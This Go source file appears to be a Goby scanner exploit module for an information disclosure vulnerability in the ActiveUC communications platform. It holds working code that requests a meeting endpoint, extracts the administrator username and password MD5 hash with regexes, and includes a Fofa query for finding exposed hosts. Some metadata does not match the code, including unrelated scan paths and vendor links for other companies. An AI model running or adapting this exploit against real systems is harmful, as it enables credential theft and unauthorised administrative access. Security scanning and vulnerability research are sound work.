package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "ActiveUC /acenter/iactiveEnterMeeting.action Information Disclosure Vulnerability",
    "Description": "<p>The mobile Unified Communication Platform (Active UC) is a comprehensive communication platform, covering text, voice, video communication and other functions, designed to improve user communication efficiency and convenience, and provide a unified communication environment. ‌ The platform supports a variety of communication devices and protocols, with a high degree of compatibility and flexibility, can adapt to different network environments and work needs.</p><p>Network dynamic unified communications platform is to use the communication interface, the VoIP phone, email and other communication system integration platform for the enterprise IT, interface/acenter/iactiveEnterMeeting action? roomid=1&amp;username=admin has information leakage vulnerabilities, which may lead to administrator password leakage and background permissions</p>",
    "Product": "ActiveUC",
    "Homepage": "http://www.iactive.com.cn/",
    "DisclosureDate": "2024-10-21",
    "PostTime": "2024-10-21",
    "Author": "3013320359@qq.com",
    "FofaQuery": "title=\"网动统一通信平台(Active UC)\" && body=\"Active UC\"",
    "GobyQuery": "title=\"网动统一通信平台(Active UC)\" && body=\"Active UC\"",
    "Level": "1",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version: <a href=\"http://www.dlink.com.cn/\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p><a href=\"http://www.iactive.com.cn/\">http://www.iactive.com.cn/</a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/143106806"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "keyinfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/de2api/engine/getEngine;.js",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "网动统一通信平台 /acenter/iactiveEnterMeeting.action 信息泄露漏洞",
            "Product": "网动统一通信平台",
            "Description": "<p>网动统一通信平台（Active UC）是一款综合性的通信平台，涵盖了文字、语音、视频通讯等功能，旨在提升用户的沟通效率和便利性，提供一个统一的通信环境。‌ 该平台支持多种通信设备和协议，具有高度的兼容性和灵活性，能够适应不同的网络环境和工作需求。<br></p><p>网动统一通信平台是采用统一的通信界面，将VoIP电话系统、电子邮件等多种沟通方式融合的企业IT平台，接口&nbsp;/acenter/iactiveEnterMeeting.action?roomid=1&amp;username=admin&nbsp;存在信息泄露漏洞，可能导致管理员密码泄露获取后台权限等<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.iactive.com.cn/\">http://www.iactive.com.cn/</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "ActiveUC /acenter/iactiveEnterMeeting.action Information Disclosure Vulnerability",
            "Product": "ActiveUC",
            "Description": "<p>The mobile Unified Communication Platform (Active UC) is a comprehensive communication platform, covering text, voice, video communication and other functions, designed to improve user communication efficiency and convenience, and provide a unified communication environment. ‌ The platform supports a variety of communication devices and protocols, with a high degree of compatibility and flexibility, can adapt to different network environments and work needs.</p><p>Network dynamic unified communications platform is to use the communication interface, the VoIP phone, email and other communication system integration platform for the enterprise IT, interface/acenter/iactiveEnterMeeting action? roomid=1&amp;username=admin has information leakage vulnerabilities, which may lead to administrator password leakage and background permissions</p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:&nbsp;<a href=\"http://www.dlink.com.cn/\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p><a href=\"http://www.iactive.com.cn/\">http://www.iactive.com.cn/</a><br></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`

	postOrGet_wD9jW6hB := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig(fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		if !strings.Contains(resp.Utf8Html, "password") {
			return "", errors.New("no information")
		}
		regular_pwd := `var\s+password\s*=\s*'([^']+)'`
		reRequest := regexp.MustCompile(regular_pwd)
		if !reRequest.MatchString(resp.Utf8Html) {
			return "", fmt.Errorf("can't match value")
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/acenter/iactiveEnterMeeting.action?roomid=1&username=admin"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/acenter/iactiveEnterMeeting.action?roomid=1&username=admin": "password",
			}
			// 函数继承
			uploadFileFunc := postOrGet_wD9jW6hB

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"keyinfo": {"/acenter/iactiveEnterMeeting.action?roomid=1&username=admin", "password"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_wD9jW6hB

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			regular_name := `var\s+username\s*=\s*'([^']+)'`
			regular_pwd := `var\s+password\s*=\s*'([^']+)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				if len(getname) > 1 {
					return getname[1], nil // 返回第一个捕获组的内容
				}
				return getname[1], fmt.Errorf("no value found")
			}

			output_name, err := makeRegular(resp, regular_name)
			output_pwd, err := makeRegular(resp, regular_pwd)

			if err != nil {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = "账号：" + output_name + "\n" + "密码MD5值：" + output_pwd
			return expResult

		},
	))
}
